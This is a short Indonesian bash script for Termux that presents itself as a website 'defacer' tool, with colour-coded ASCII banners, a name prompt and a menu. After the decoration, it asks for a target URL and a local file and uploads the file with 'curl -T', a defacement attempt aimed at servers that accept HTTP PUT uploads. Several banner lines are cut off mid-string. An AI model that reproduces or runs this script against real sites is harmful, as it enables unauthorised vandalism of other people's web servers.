clear

MERAH="\033[31;1m"
HIJAU="\033[32;2m"

clear
echo "======================================================"
echo "${HIJAU}HAI SELAMAT DATANG DI DEFACER Mr.XXXTRI3WSL"
echo "======================================================"
echo "===================="
echo "MASUKKAN NAMA ANDA"
echo "===================="
echo "NAMA ANDA : "
read NAMA
clear

echo "======================================="
echo "${HIJAU}SILAHKAN PILIH KAKAK"
echo "======================================="
echo "${MERAH}1. LANJUT TOOLS"
echo "${HIJAU}2. EXIT"

read -p "silahkan pilih menu : " pilihan

clear
echo "${HIJAU}DEFACE"
echo "╔══════════════════════╗"
echo "║╔════════════════════╗╚╗"         "===========================                  >
echo "║║██░░░░░░░░░░░░░░░░░░╚╗╚╗"        "Author : Mr XXXTRI3WSL"
echo "║║██░░░${MERAH}Mr XXXTRI3WSL ░░░░░ ─║║║"   "Youtube: AGUNG ZKYT"
echo "║║██░░░░░░░░░░░░░░░░░░╔╝╔╝"        "Team   : NCPH - Network Cra                  >
echo "║╚════════════════════╝╔╝"         "GitHub : https://github.com                  >
echo "╚══════════════════════╝"          "===========================                  >

echo "${MERAH}"
echo "=========================================="
echo "GUNAKAN INI DENGAN BIJAK YAH KAKAK"
echo "=================================≠========"
echo "${HIJAU}"
echo "=================="       "======================="
echo "= Mr XXXTRI3WSL  ="       "=JANGAN RECODE YA KAK ="
echo "=================="       "======================="



echo "masukkan target anda : "
read target
sleep 2
echo "masukkan path fordel file anda : "
read file
sleep 2
echo "tunggu...."
sleep 4
curl -T /data/data/com.termux/files/home/$file $target